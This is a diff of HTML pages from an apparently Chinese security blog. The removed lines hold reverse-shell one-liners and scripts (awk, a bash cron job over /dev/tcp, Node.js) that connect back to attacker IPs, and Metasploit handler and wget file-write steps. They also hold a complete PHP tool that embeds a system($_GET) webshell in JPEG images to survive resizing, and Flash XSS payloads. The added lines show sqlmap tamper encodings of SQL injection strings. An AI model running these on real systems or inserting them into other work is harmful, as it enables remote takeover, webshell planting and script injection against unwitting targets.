-<h3 id="xterm"><a href="#xterm" class="headerlink" title="xterm"></a>xterm</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; Xnest :1</span><br><span class="line">&gt; xhost +&lt;IPTARGET&gt;</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; xterm -display &lt;IP&gt;:1</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; /usr/openwin/bin/xterm -display &lt;IP&gt;:1</span><br></pre></td></tr></table></figure>
-<h3 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/awk -f</span><br><span class="line">BEGIN &#123;</span><br><span class="line">s = &quot;/inet/tcp/0/&lt;IP&gt;/&lt;PORT&gt;&quot;</span><br><span class="line">while(42) &#123;</span><br><span class="line">do&#123;</span><br><span class="line">printf &quot;shell&gt;&quot; |&amp; s</span><br><span class="line">s |&amp; getline c</span><br><span class="line">if(c)&#123;</span><br><span class="line">while ((c |&amp; getline) &gt; 0)</span><br><span class="line">print $0 |&amp; s</span><br><span class="line">close(c)</span><br><span class="line">&#125;</span><br><span class="line">&#125; while(c != &quot;exit&quot;)</span><br><span class="line">close(s)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; awk &apos;BEGIN &#123;s = &quot;/inet/tcp/0/&lt;IP&gt;/&lt;PORT&gt;&quot;; while(42) &#123; do&#123; printf &quot;shell&gt;&quot; |&amp; s; s |&amp; getline c; if(c)&#123; while ((c |&amp; getline) &gt; 0) print $0 |&amp; s; close(c); &#125; &#125; while(c != &quot;exit&quot;) close(s); &#125;&#125;&apos; /dev/null</span><br></pre></td></tr></table></figure>
-<h3 id="wget"><a href="#wget" class="headerlink" title="wget"></a>wget</h3><blockquote>
-<p>首先我们先建立一个计划任务文件</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat&gt;cronshell &lt;&lt;EOD</span><br><span class="line">PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</span><br><span class="line">* * * * * root bash -c &apos;&lt;&amp;112-;exec 112&lt;&gt;/dev/tcp/ 192.168.220.128/4444;sh &lt;&amp;112 &gt;&amp;112 2&gt;&amp;112&apos;                             </span><br><span class="line">EOD</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>metasploit</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; use exploit/multi/handler</span><br><span class="line">&gt; set PAYLOAD cmd/unix/reverse_bash</span><br><span class="line">&gt; set LHOST &lt;IP&gt;</span><br><span class="line">&gt; set LPORT 4444</span><br><span class="line">&gt; run -j</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>搭建一个攻击ftp</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; use auxiliary/server/wget_symlink_file_write</span><br><span class="line">&gt; set TARGET_FILE /etc/cron.d/cronshell</span><br><span class="line">&gt; set TARGET_DATA file:cronshell</span><br><span class="line">&gt; set SRVPORT 21</span><br><span class="line">&gt; run</span><br></pre></td></tr></table></figure>
-<h3 id="Node-js"><a href="#Node-js" class="headerlink" title="Node.js"></a>Node.js</h3><blockquote>
-<p>reverse_shell.js</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">(function()&#123;</span><br><span class="line">    var net = require(&quot;net&quot;),</span><br><span class="line">        cp = require(&quot;child_process&quot;),</span><br><span class="line">        sh = cp.spawn(&quot;/bin/sh&quot;, []);</span><br><span class="line">    var client = new net.Socket();</span><br><span class="line">    client.connect(8080, &quot;10.17.26.64&quot;, function()&#123;</span><br><span class="line">        client.pipe(sh.stdin);</span><br><span class="line">        sh.stdout.pipe(client);</span><br><span class="line">        sh.stderr.pipe(client);</span><br><span class="line">    &#125;);</span><br><span class="line">    return /a/; // Prevents the Node.js application form crashing</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://blog.safebuff.com/?name=[&quot;./;eval(new Buffer(&apos;PAYLOAD&apos;, &apos;hex&apos;).toString());//*&quot;]</span><br></pre></td></tr></table></figure>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-  <link itemprop="mainEntityOfPage" href="http://blog.safebuff.com/2016/06/17/Bypass-imagecopyresampled-and-imagecopyresized-generate-PHP-Webshell/">
-
-  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <meta itemprop="name" content="xl7dev">
-    <meta itemprop="description" content="">
-    <meta itemprop="image" content="https://avatars2.githubusercontent.com/u/9393930?v=3&s=460">
-  </span>
-
-  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="xl7dev">
-    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
-      <img style="display:none;" itemprop="url image" alt="xl7dev" src="">
-    </span>
-  </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2016/06/17/Bypass-imagecopyresampled-and-imagecopyresized-generate-PHP-Webshell/" itemprop="url">
-                  Bypass imagecopyresampled and imagecopyresized generate PHP Webshell 
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-06-17T23:51:13+08:00">
-                2016-06-17
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-
-          
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <blockquote>
-<p>修改如下png为php扩展</p>
-</blockquote>
-<p><a href="https://www.idontplaydarts.com/images/xsspng.png" target="_blank" rel="external">XSSPNG</a><br><a href="https://www.idontplaydarts.com/images/phppng.png" target="_blank" rel="external">PHPPNG</a></p>
-<h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	/*</span><br><span class="line"></span><br><span class="line">	The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().</span><br><span class="line">	It is necessary that the size and quality of the initial image are the same as those of the processed image.</span><br><span class="line"></span><br><span class="line">	1) Upload an arbitrary image via secured files upload script</span><br><span class="line">	2) Save the processed image and launch:</span><br><span class="line">	jpg_payload.php &lt;jpg_name.jpg&gt;</span><br><span class="line"></span><br><span class="line">	In case of successful injection you will get a specially crafted image, which should be uploaded again.</span><br><span class="line"></span><br><span class="line">	Since the most straightforward injection method is used, the following problems can occur:</span><br><span class="line">	1) After the second processing the injected data may become partially corrupted.</span><br><span class="line">	2) The jpg_payload.php script outputs &quot;Something&apos;s wrong&quot;.</span><br><span class="line">	If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.</span><br><span class="line"></span><br><span class="line">	Sergey Bobrov @Black2Fan.</span><br><span class="line"></span><br><span class="line">	See also:</span><br><span class="line">	https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span><br><span class="line"></span><br><span class="line">	*/</span><br><span class="line"></span><br><span class="line">	$miniPayload = &apos;&lt;?php system($_GET[c]);?&gt;&apos;;</span><br><span class="line"></span><br><span class="line">	if(!extension_loaded(&apos;gd&apos;) || !function_exists(&apos;imagecreatefromjpeg&apos;)) &#123;</span><br><span class="line">    	die(&apos;php-gd is not installed&apos;);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	if(!isset($argv[1])) &#123;</span><br><span class="line">		die(&apos;php jpg_payload.php &lt;jpg_name.jpg&gt;&apos;);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	set_error_handler(&quot;custom_error_handler&quot;);</span><br><span class="line"></span><br><span class="line">	for($pad = 0; $pad &lt; 1024; $pad++) &#123;</span><br><span class="line">		$nullbytePayloadSize = $pad;</span><br><span class="line">		$dis = new DataInputStream($argv[1]);</span><br><span class="line">		$outStream = file_get_contents($argv[1]);</span><br><span class="line">		$extraBytes = 0;</span><br><span class="line">		$correctImage = TRUE;</span><br><span class="line"></span><br><span class="line">		if($dis-&gt;readShort() != 0xFFD8) &#123;</span><br><span class="line">			die(&apos;Incorrect SOI marker&apos;);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) &#123;</span><br><span class="line">			$marker = $dis-&gt;readByte();</span><br><span class="line">			$size = $dis-&gt;readShort() - 2;</span><br><span class="line">			$dis-&gt;skip($size);</span><br><span class="line">			if($marker === 0xDA) &#123;</span><br><span class="line">				$startPos = $dis-&gt;seek();</span><br><span class="line">				$outStreamTmp =</span><br><span class="line">					substr($outStream, 0, $startPos) .</span><br><span class="line">					$miniPayload .</span><br><span class="line">					str_repeat(&quot;\0&quot;,$nullbytePayloadSize) .</span><br><span class="line">					substr($outStream, $startPos);</span><br><span class="line">				checkImage(&apos;_&apos;.$argv[1], $outStreamTmp, TRUE);</span><br><span class="line">				if($extraBytes !== 0) &#123;</span><br><span class="line">					while((!$dis-&gt;eof())) &#123;</span><br><span class="line">						if($dis-&gt;readByte() === 0xFF) &#123;</span><br><span class="line">							if($dis-&gt;readByte !== 0x00) &#123;</span><br><span class="line">								break;</span><br><span class="line">							&#125;</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">					$stopPos = $dis-&gt;seek() - 2;</span><br><span class="line">					$imageStreamSize = $stopPos - $startPos;</span><br><span class="line">					$outStream =</span><br><span class="line">						substr($outStream, 0, $startPos) .</span><br><span class="line">						$miniPayload .</span><br><span class="line">						substr(</span><br><span class="line">							str_repeat(&quot;\0&quot;,$nullbytePayloadSize).</span><br><span class="line">								substr($outStream, $startPos, $imageStreamSize),</span><br><span class="line">							0,</span><br><span class="line">							$nullbytePayloadSize+$imageStreamSize-$extraBytes) .</span><br><span class="line">								substr($outStream, $stopPos);</span><br><span class="line">				&#125; elseif($correctImage) &#123;</span><br><span class="line">					$outStream = $outStreamTmp;</span><br><span class="line">				&#125; else &#123;</span><br><span class="line">					break;</span><br><span class="line">				&#125;</span><br><span class="line">				if(checkImage(&apos;payload_&apos;.$argv[1], $outStream)) &#123;</span><br><span class="line">					die(&apos;Success!&apos;);</span><br><span class="line">				&#125; else &#123;</span><br><span class="line">					break;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	unlink(&apos;payload_&apos;.$argv[1]);</span><br><span class="line">	die(&apos;Something\&apos;s wrong&apos;);</span><br><span class="line"></span><br><span class="line">	function checkImage($filename, $data, $unlink = FALSE) &#123;</span><br><span class="line">		global $correctImage;</span><br><span class="line">		file_put_contents($filename, $data);</span><br><span class="line">		$correctImage = TRUE;</span><br><span class="line">		imagecreatefromjpeg($filename);</span><br><span class="line">		if($unlink)</span><br><span class="line">			unlink($filename);</span><br><span class="line">		return $correctImage;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	function custom_error_handler($errno, $errstr, $errfile, $errline) &#123;</span><br><span class="line">		global $extraBytes, $correctImage;</span><br><span class="line">		$correctImage = FALSE;</span><br><span class="line">		if(preg_match(&apos;/(\d+) extraneous bytes before marker/&apos;, $errstr, $m)) &#123;</span><br><span class="line">			if(isset($m[1])) &#123;</span><br><span class="line">				$extraBytes = (int)$m[1];</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	class DataInputStream &#123;</span><br><span class="line">		private $binData;</span><br><span class="line">		private $order;</span><br><span class="line">		private $size;</span><br><span class="line"></span><br><span class="line">		public function __construct($filename, $order = false, $fromString = false) &#123;</span><br><span class="line">			$this-&gt;binData = &apos;&apos;;</span><br><span class="line">			$this-&gt;order = $order;</span><br><span class="line">			if(!$fromString) &#123;</span><br><span class="line">				if(!file_exists($filename) || !is_file($filename))</span><br><span class="line">					die(&apos;File not exists [&apos;.$filename.&apos;]&apos;);</span><br><span class="line">				$this-&gt;binData = file_get_contents($filename);</span><br><span class="line">			&#125; else &#123;</span><br><span class="line">				$this-&gt;binData = $filename;</span><br><span class="line">			&#125;</span><br><span class="line">			$this-&gt;size = strlen($this-&gt;binData);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		public function seek() &#123;</span><br><span class="line">			return ($this-&gt;size - strlen($this-&gt;binData));</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		public function skip($skip) &#123;</span><br><span class="line">			$this-&gt;binData = substr($this-&gt;binData, $skip);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		public function readByte() &#123;</span><br><span class="line">			if($this-&gt;eof()) &#123;</span><br><span class="line">				die(&apos;End Of File&apos;);</span><br><span class="line">			&#125;</span><br><span class="line">			$byte = substr($this-&gt;binData, 0, 1);</span><br><span class="line">			$this-&gt;binData = substr($this-&gt;binData, 1);</span><br><span class="line">			return ord($byte);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		public function readShort() &#123;</span><br><span class="line">			if(strlen($this-&gt;binData) &lt; 2) &#123;</span><br><span class="line">				die(&apos;End Of File&apos;);</span><br><span class="line">			&#125;</span><br><span class="line">			$short = substr($this-&gt;binData, 0, 2);</span><br><span class="line">			$this-&gt;binData = substr($this-&gt;binData, 2);</span><br><span class="line">			if($this-&gt;order) &#123;</span><br><span class="line">				$short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]);</span><br><span class="line">			&#125; else &#123;</span><br><span class="line">				$short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]);</span><br><span class="line">			&#125;</span><br><span class="line">			return $short;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		public function eof() &#123;</span><br><span class="line">			return !$this-&gt;binData||(strlen($this-&gt;binData) === 0);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-  <link itemprop="mainEntityOfPage" href="http://blog.safebuff.com/2016/06/17/Flash-files-Vulnerable-Payload/">
-
-  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <meta itemprop="name" content="xl7dev">
-    <meta itemprop="description" content="">
-    <meta itemprop="image" content="https://avatars2.githubusercontent.com/u/9393930?v=3&s=460">
-  </span>
-
-  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="xl7dev">
-    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
-      <img style="display:none;" itemprop="url image" alt="xl7dev" src="">
-    </span>
-  </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2016/06/17/Flash-files-Vulnerable-Payload/" itemprop="url">
-                  Flash files Vulnerable Payload
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-06-17T11:27:37+08:00">
-                2016-06-17
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-
-          
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h4 id="SWFIntruder"><a href="#SWFIntruder" class="headerlink" title="SWFIntruder"></a><a href="https://github.com/irsdl/updated-SWFIntruder" target="_blank" rel="external">SWFIntruder</a></h4><p><a href="https://gist.github.com/cure53/df34ea68c26441f3ae98f821ba1feb9c#intro" target="_blank" rel="external">https://gist.github.com/cure53/df34ea68c26441f3ae98f821ba1feb9c#intro</a></p>
-<h4 id="Flashbang"><a href="#Flashbang" class="headerlink" title="Flashbang"></a>Flashbang</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; git clone https://github.com/cure53/Flashbang --recursive</span><br><span class="line">&gt; cd Flashbang/shumway</span><br><span class="line">&gt; git submodule init</span><br><span class="line">&gt; make bootstrap</span><br><span class="line">&gt; python -m SimpleHTTPServer 80     # 在Flashbang目录下启动一个Web服务,访问http://127.0.0.1/src/flashbang.html</span><br></pre></td></tr></table></figure>
-<h4 id="FFDec"><a href="#FFDec" class="headerlink" title="FFDec"></a>FFDec</h4><p><a href="https://github.com/jindrapetrik/jpexs-decompiler/releases" target="_blank" rel="external">FFDec</a></p>
-<h4 id="Vul-function"><a href="#Vul-function" class="headerlink" title="Vul function"></a>Vul function</h4><h5 id="1-URLRequest-–-gt-getURL"><a href="#1-URLRequest-–-gt-getURL" class="headerlink" title="1) URLRequest –&gt; getURL"></a>1) URLRequest –&gt; getURL</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// as3.0 version</span><br><span class="line">navigateToURL(new URLRequest(link), &quot;_self&quot;);</span><br><span class="line">//as2.0 version</span><br><span class="line">getURL(link,&quot;_self&quot;);</span><br></pre></td></tr></table></figure>
+            <h3 id="apostrophemask-py"><a href="#apostrophemask-py" class="headerlink" title="apostrophemask.py"></a>apostrophemask.py</h3><p><strong>Function: 用utf8编码引号</strong></p>
+<p><strong>Platform:All</strong></p>
 <blockquote>
 <p>example</p>
 </blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.target.com/movie.swf?link=javascript:alert(1)</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var root_xml:XML = new XML();</span><br><span class="line">root_xml.ignoreWhite = true;</span><br><span class="line">root_xml.onLoad = function(success)&#123;</span><br><span class="line">    if(success)&#123;</span><br><span class="line">        getURL(root_xml.childNodes[0].childNodes[0].childNodes[0].nodeValue)</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        getURL(&quot;javascript:alert(‘fail’)&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">root_xml.load(_root.url);</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;</span><br><span class="line">&lt;data&gt;</span><br><span class="line">    &lt;link&gt;javascript:alert(&apos;xss&apos;)&lt;/link&gt;</span><br><span class="line">&lt;/data&gt;</span><br></pre></td></tr></table></figure>
-<h5 id="2-ExternalInterface-call"><a href="#2-ExternalInterface-call" class="headerlink" title="2) ExternalInterface.call"></a>2) ExternalInterface.call</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">try &#123; __Flash__toXML(函数名(&quot;参数1&quot;)) ; &#125; catch (e) &#123; &quot;&lt;undefined/&gt;&quot;; &#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND &apos;1&apos;=&apos;1 ==&gt; 1 AND %EF%BC%871%EF%BC%87=%EF%BC%871</span><br></pre></td></tr></table></figure>
+<h3 id="apostrophenullencode-py"><a href="#apostrophenullencode-py" class="headerlink" title="apostrophenullencode.py"></a>apostrophenullencode.py</h3><p><strong>Function: ‘ ==&gt; %00%27</strong></p>
+<p><strong>Platform: All</strong></p>
 <blockquote>
 <p>example</p>
 </blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">http://www.target.com/ExternalInterface_first.swf?func=a1lert(1))&#125;catch(e)&#123;alert(100)&#125;//</span><br><span class="line"></span><br><span class="line">Output</span><br><span class="line"></span><br><span class="line">try &#123; __Flash__toXML(a1lert(1))&#125;catch(e)&#123;alert(100)&#125;// (&quot;参数1&quot;)) ; &#125; catch (e) &#123; &quot;&lt;undefined/&gt;&quot;; &#125;</span><br><span class="line"></span><br><span class="line">http://www.target.com/ExternalInterface_second.swf?par=1111\%22),al)&#125;catch(e)&#123;alert(1000)&#125;//</span><br><span class="line"></span><br><span class="line">Output</span><br><span class="line"></span><br><span class="line">try &#123; __Flash__toXML(alert(&quot;1111\\&quot;),al&#125;catch(e)&#123;alert(1000)&#125;</span><br></pre></td></tr></table></figure>
-<h4 id="3-htmlText"><a href="#3-htmlText" class="headerlink" title="3) htmlText"></a>3) htmlText</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_root.createTextField(&quot;Inputbox&quot;,0,20,20,320,240);</span><br><span class="line">_root.Inputbox.html=true;</span><br><span class="line">_root.Inputbox.htmlText=&quot;Welcome&quot; + _root.username;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND &apos;1&apos;=&apos;1 ==&gt; 1 AND %00%271%00%27=%00%271</span><br></pre></td></tr></table></figure>
+<h3 id="appendnullbyte-py"><a href="#appendnullbyte-py" class="headerlink" title="appendnullbyte.py"></a>appendnullbyte.py</h3><p><strong>Function: 空格 ==&gt; %00</strong></p>
+<p><strong>Platform: Microsoft Access</strong></p>
 <blockquote>
 <p>example</p>
 </blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://www.target.com/htmltext.swf?url=?username=&lt;img src=&apos;javascript:alert(&quot;XSS&quot;)&apos;&gt;</span><br><span class="line"></span><br><span class="line">Output</span><br><span class="line"></span><br><span class="line">&quot;Welcome &lt;img src=&apos;javascript:alert(XSS)&apos;&gt;&quot;</span><br></pre></td></tr></table></figure>
-<h4 id="4-loadMovie-asfunction"><a href="#4-loadMovie-asfunction" class="headerlink" title="4) loadMovie(), asfunction()"></a>4) loadMovie(), asfunction()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_root.loadMovie(_root.movietoload)</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.target.com/FlashApp.swf?movietoload=http://hackerdomain/hackedFlash.swf</span><br></pre></td></tr></table></figure>
